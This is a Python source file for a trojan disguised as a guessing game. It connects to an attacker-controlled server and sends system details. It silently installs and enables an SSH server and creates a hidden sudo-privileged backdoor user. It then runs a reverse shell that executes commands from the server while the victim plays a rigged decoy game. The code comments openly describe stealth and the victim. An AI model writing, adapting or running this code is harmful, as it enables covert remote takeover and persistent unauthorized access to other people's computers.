import socket
import os
import subprocess
import sys
import platform
import time
import threading

SERVER_HOST = "x.x.x.x" # Add the IP address of the server machine here
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, can be increased
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object and connect to the server
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode()) # sending the current working directory to the attacker

# enable the attacker to ssh into the computer later on, while not providing
# terminal output of the process, to be stealthy
os.system("sudo apt-get install openssh-server > /dev/null 2>&1")  # redirecting any output so that the victim doesn't see it
os.system("sudo systemctl enable ssh > /dev/null 2>&1") # redirecting any output so that the victim doesn't see it

# add another admin user that you will be able to ssh into later on, even if the victim stops running this program
username = 'baduser' # sample username
password = 'securePassword' # sample password
os.system(f'(echo "{password}"; echo "{password}") | sudo adduser {username} > /dev/null 2>&1') # creating the user account, entering the password, and redirecting any output so that the victim doesn't see it
os.system(f'usermod -aG sudo {username}') # giving the new user admin permissions

# send the OS type, so the attacker can see what they're working with
osType = (platform.system()) # will return something like 'Linux' or 'Windows' or something similar
osRelease = platform.release() # will give more detail than just the OS type above
s.send((osType + ' ' +  osRelease).encode()) # sending the OS type and release to the attacker, formatted

def receiveCommands(): # The function that allows the attacker to send commands to the victim while the victim runs the program
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splitted_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splitted_command[0].lower() == "cd":
            # cd command, change directory
            try: 
                os.chdir(' '.join(splitted_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # close client connection
    s.close()

def game(): # the function for the code that the user thinks is the only thing running. This could be anything, from this simple 'game' to something much more legitimate
    done = False
    while not done:
        # Confuse unsuspecting user
        print("Compiling quantum micro-algorithms...")
        time.sleep(3)
        guess = int(input("What number am I thinking of between 1 and 5? "))
        time.sleep(2)
        print("Analysing virtual metametadata...")
        time.sleep(2)
        if guess == 0: # Confuse them even more
            print("Correct! Your powers of deduction are impressive.")
            done = True
        else:
            print("Unlucky, try again")

# Initialise both functions
t1 = threading.Thread(target=receiveCommands, args=())
t2 = threading.Thread(target=game, args=())

# Start both functions 'simultaneously', so that the attacker can send commands to the victim while the victim plays the 'game'
t1.start()
t2.start()
